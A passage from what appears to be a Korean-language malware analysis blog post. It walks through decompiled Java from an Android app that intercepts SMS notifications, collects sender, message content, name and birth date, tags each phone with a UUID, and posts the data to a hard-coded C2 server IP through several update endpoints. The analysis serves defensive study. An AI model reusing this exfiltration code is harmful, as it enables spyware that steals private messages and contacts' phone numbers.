+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>string<span style="color:#f92672">.</span><span style="color:#a6e22e">requals</span><span style="color:#f92672">(</span>packageName<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;com.android.mms&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> string<span style="color:#f92672">.</span><span style="color:#a6e22e">requals</span><span style="color:#f92672">(</span>packageName<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;com.samsung.android.messaging&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> string<span style="color:#f92672">.</span><span style="color:#a6e22e">requals</span><span style="color:#f92672">(</span>packageName<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;com.google.android.apps.messaging&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            Bundle bundle <span style="color:#f92672">=</span> sbn<span style="color:#f92672">.</span><span style="color:#a6e22e">getNotification</span><span style="color:#f92672">().</span><span style="color:#a6e22e">extras</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            String title <span style="color:#f92672">=</span> bundle<span style="color:#f92672">.</span><span style="color:#a6e22e">getString</span><span style="color:#f92672">(</span>NotificationCompat<span style="color:#f92672">.</span><span style="color:#a6e22e">EXTRA_TITLE</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>title <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                title <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            String string <span style="color:#f92672">=</span> bundle<span style="color:#f92672">.</span><span style="color:#a6e22e">getString</span><span style="color:#f92672">(</span>NotificationCompat<span style="color:#f92672">.</span><span style="color:#a6e22e">EXTRA_TEXT</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            String content <span style="color:#f92672">=</span> string <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> string <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ZHbVuIv<span style="color:#f92672">.</span><span style="color:#a6e22e">TEUYb</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;메세지&#34;</span><span style="color:#f92672">,</span> content<span style="color:#f92672">)</span> <span style="color:#f92672">||</span> ZHbVuIv<span style="color:#f92672">.</span><span style="color:#a6e22e">TEUYb</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;문자&#34;</span><span style="color:#f92672">,</span> content<span style="color:#f92672">)</span> <span style="color:#f92672">||</span> ZHbVuIv<span style="color:#f92672">.</span><span style="color:#a6e22e">TEUYb</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sms&#34;</span><span style="color:#f92672">,</span> content<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">long</span> currentTimeMillis <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">currentTimeMillis</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            String msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;收到短信通知: 标题=&#34;</span> <span style="color:#f92672">+</span> title <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, 内容=&#34;</span> <span style="color:#f92672">+</span> content<span style="color:#f92672">;</span> <span style="color:#75715e">// &#34;문자 메시지 알림 수신: 제목=&#34;, &#34;, 내용=&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            string<span style="color:#f92672">.</span><span style="color:#a6e22e">copy</span><span style="color:#f92672">(</span>msg<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            CustomLogger<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;SmsNotificationListener&#34;</span><span style="color:#f92672">,</span> msg<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            Map pack_data <span style="color:#f92672">=</span> mSzUY<span style="color:#f92672">.</span><span style="color:#a6e22e">pack_data</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;description&#34;</span><span style="color:#f92672">,</span> content<span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;phone&#34;</span><span style="color:#f92672">,</span> title<span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;send_time&#34;</span><span style="color:#f92672">,</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>currentTimeMillis<span style="color:#f92672">)),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;is_color&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            JSONArray jSONArray <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONArray<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            jSONArray<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> JSONObject<span style="color:#f92672">(</span>pack_data<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            String jSONArray2 <span style="color:#f92672">=</span> jSONArray<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            string<span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">(</span>jSONArray2<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;toString(...)&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            MMKV mmkv <span style="color:#f92672">=</span> GfKxQHQ<span style="color:#f92672">.</span><span style="color:#a6e22e">wmbNnZ</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mmkv <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                string<span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;mainMMKV&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            String decodeString <span style="color:#f92672">=</span> mmkv<span style="color:#f92672">.</span><span style="color:#a6e22e">decodeString</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uuid&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>decodeString <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> decodeString<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                decodeString <span style="color:#f92672">=</span> UUID<span style="color:#f92672">.</span><span style="color:#a6e22e">randomUUID</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                string<span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">(</span>decodeString<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;toString(...)&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                MMKV mmkv2 <span style="color:#f92672">=</span> GfKxQHQ<span style="color:#f92672">.</span><span style="color:#a6e22e">wmbNnZ</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mmkv2 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    string<span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;mainMMKV&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                mmkv2<span style="color:#f92672">.</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uuid&#34;</span><span style="color:#f92672">,</span> decodeString<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            Map pack_data2 <span style="color:#f92672">=</span> mSzUY<span style="color:#f92672">.</span><span style="color:#a6e22e">pack_data</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uuid&#34;</span><span style="color:#f92672">,</span> decodeString<span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">,</span> jSONArray2<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            FftZ fftZ <span style="color:#f92672">=</span> FHL<span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            FHL<span style="color:#f92672">.</span><span style="color:#a6e22e">SEND</span><span style="color:#f92672">(</span>C2_URL_GEN<span style="color:#f92672">.</span><span style="color:#a6e22e">update_user_msg</span><span style="color:#f92672">,</span> pack_data2<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> AwNbFoW<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">));</span> <span style="color:#75715e">// SEND
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            AwNbFoW<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span></code></pre></div><p>EmIyzOjRW 클래스는 이런식으로 문자 메세지를 열심히 기록한다.<br>
+그래서 문자 title, content를 분리해서 중국어로 로그를 찍는 것을 확인할 수 있다.<br>
+약간 title 같은데 발신자 정보가 들어가니까 그걸로 주변 사람들의 전화번호를 수집하려는 목적도 있어 보인다.<br>
+각자 폰마다 uuid를 부여해서 C2 서버로 보내는 것을 확인할 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> GNXEC<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> nvf.HRhLr<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* renamed from: GNXEC.FHL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: classes.dex */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C2_URL_GEN</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* renamed from: EKRSx */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String update_user_msg<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* renamed from: RhN */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String update_user_notes<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* renamed from: ifwfG */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String update_user_long<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String obj <span style="color:#f92672">=</span> nvf<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">.</span><span style="color:#a6e22e">HkbDkTL</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://173.234.30.133&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>HRhLr<span style="color:#f92672">.</span><span style="color:#a6e22e">Aztjigt</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>HRhLr<span style="color:#f92672">.</span><span style="color:#a6e22e">Aztjigt</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;https://&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            obj <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>HRhLr<span style="color:#f92672">.</span><span style="color:#a6e22e">mgA</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            obj <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        update_user_long <span style="color:#f92672">=</span> QFMtNe<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">UMEwxCp</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;updateUserLong&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        update_user_notes <span style="color:#f92672">=</span> QFMtNe<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">UMEwxCp</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;updateUserNotes&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        update_user_msg <span style="color:#f92672">=</span> QFMtNe<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">UMEwxCp</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;updateUserMsg&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>이게 C2랑 통신하기 전에 URL을 만드는 클래스이다.<br>
+message listener 등록된거에서 수집된 정보는 updateUserMsg 엔드포인트로 POST로 날아간다.</p>
+<h2 id="mainactivity">MainActivity<a hidden class="anchor" aria-hidden="true" href="#mainactivity">#</a></h2>
+<h3 id="updateusernotes">updateUserNotes<a hidden class="anchor" aria-hidden="true" href="#updateusernotes">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle bundle<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>bundle<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        EdgeToEdge<span style="color:#f92672">.</span><span style="color:#a6e22e">enable$default</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        setContentView<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">layout</span><span style="color:#f92672">.</span><span style="color:#a6e22e">activity_main</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        ViewCompat<span style="color:#f92672">.</span><span style="color:#a6e22e">setOnApplyWindowInsetsListener</span><span style="color:#f92672">(</span>findViewById<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">main</span><span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> GfKxQHQ<span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">((</span>Button<span style="color:#f92672">)</span> findViewById<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">nkzagw</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">setOnClickListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> okn<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>클릭 리스너를 등록한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">((</span>FrameLayout<span style="color:#f92672">)</span> mainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">egaqflmvpsuwvv</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">setVisibility</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">RhN</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    Map map <span style="color:#f92672">=</span> AwNbFoW<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">.</span><span style="color:#a6e22e">get_user_data</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                    Map pack_data <span style="color:#f92672">=</span> mSzUY<span style="color:#f92672">.</span><span style="color:#a6e22e">pack_data</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">,</span> NAME<span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;birth&#34;</span><span style="color:#f92672">,</span> BIRTH<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                    LinkedHashMap linkedHashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> LinkedHashMap<span style="color:#f92672">(</span>map<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    linkedHashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">putAll</span><span style="color:#f92672">(</span>pack_data<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    FftZ fftZ <span style="color:#f92672">=</span> sjR<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                    sjR<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SEND</span><span style="color:#f92672">(</span>C2_URL_GEN<span style="color:#f92672">.</span><span style="color:#a6e22e">update_user_notes</span><span style="color:#f92672">,</span> linkedHashMap<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> AwNbFoW<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>birth 길이가 6글자 이상인 것만 받도록 되어 있는데, 위와 같이 이름이랑 생년월일 수집해서 updateUserNotes 엔드포인트로 보낸다.</p>
+<h3 id="updateuserlong">updateUserLong<a hidden class="anchor" aria-hidden="true" href="#updateuserlong">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onResume</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onResume</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span><span style="display:flex;"><span>        TiVm tiVm2 <span style="color:#f92672">=</span> TiVm<span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>jhLoO<span style="color:#f92672">.</span><span style="color:#a6e22e">okn</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GAfXIJ</span><span style="color:#f92672">(</span>FHL<span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">()))</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// notification listener ON or OFF?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            getPackageManager<span style="color:#f92672">().</span><span style="color:#a6e22e">setComponentEnabledSetting</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ComponentName<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> EmIyzOjRW<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">RhN</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                Map map <span style="color:#f92672">=</span> ZHbVuIv<span style="color:#f92672">.</span><span style="color:#a6e22e">get_user_data</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                FftZ fftZ <span style="color:#f92672">=</span> sjR<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                sjR<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SEND</span><span style="color:#f92672">(</span>C2_URL_GEN<span style="color:#f92672">.</span><span style="color:#a6e22e">update_user_long</span><span style="color:#f92672">,</span> map<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> ZHbVuIv<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            CGLZX<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        String string <span style="color:#f92672">=</span> getString<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">string</span><span style="color:#f92672">.</span><span style="color:#a6e22e">app_name</span><span style="color:#f92672">);</span>
